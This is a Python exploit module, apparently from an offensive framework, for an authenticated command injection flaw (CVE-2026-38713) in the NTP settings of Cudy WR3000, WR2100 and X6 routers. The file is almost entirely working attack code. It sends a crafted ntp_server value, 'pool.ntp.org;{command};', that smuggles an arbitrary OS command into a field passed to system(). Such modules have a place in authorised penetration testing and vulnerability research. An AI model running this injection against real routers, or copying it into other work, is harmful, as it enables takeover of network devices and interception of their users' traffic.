# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Cudy Router Command Injection (CVE-2026-38713).

    The web management interface on Cudy wireless routers contains
    a command injection vulnerability in the NTP server configuration
    endpoint. The ``ntp_server`` parameter in ``/cgi-bin/luci`` is
    passed to a system() call without sanitization, allowing an
    authenticated attacker to execute arbitrary OS commands.

    CVSS v3.1: 8.0 (High), AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cudy Router NTP Command Injection (CVE-2026-38713)",
        "description": (
            "Exploits CVE-2026-38713 via command injection in the NTP "
            "server configuration of Cudy routers. The ntp_server "
            "parameter is passed unsanitized to system(), allowing "
            "authenticated OS command execution."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-38713",
            "https://www.cudy.com/support",
        ),
        "disclosure_date": "2026-05-15",
        "platform": "linux",
        "arch": "mips",
        "privileged": True,
        "targets": (
            "Cudy WR3000 (firmware < 1.0.8)",
            "Cudy WR2100 (firmware < 1.0.6)",
            "Cudy X6 (firmware < 1.0.4)",
        ),
    }

    target = OptIP("", "Target Cudy router IP")
    port = OptPort(80, "Target HTTP port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject via NTP server field")
    token = OptString("", "Authentication token (from login)")

    _NTP_PATH = "/cgi-bin/luci/admin/system/time"

    def _build_url(self, path: str) -> str:
        return f"http://{self.target}:{self.port}{path}"

    def _http_post(self, path: str, data: dict) -> tuple[int, str]:
        url = self._build_url(path)
        encoded = urllib.parse.urlencode(data).encode("utf-8")
        req = urllib.request.Request(url, data=encoded, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        if self.token:
            req.add_header("Cookie", f"sysauth={self.token}")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    @mute
    def check(self) -> bool:
        """Check if the web interface is reachable."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(f"Cannot connect to {self.target}:{self.port}")
            return

        if not self.token:
            print_error("Authentication token required; login first and set 'token'")
            return

        print_success("Web interface reachable; injecting command via NTP config")
        self._exploit()

    def _exploit(self) -> None:
        injected = f"pool.ntp.org;{self.command};"

        payload = {
            "ntp_server": injected,
            "timezone": "UTC",
            "save": "1",
        }

        print_status(f"Injecting via ntp_server: {injected!r}")

        status, body = self._http_post(self._NTP_PATH, payload)

        if status == 200:
            print_success(
                f"HTTP {status}. Command '{self.command}' should have "
                f"executed on the Cudy router."
            )
        elif status == 403:
            print_error("Access denied; check authentication token")
        else:
            print_error(f"Unexpected HTTP {status}")
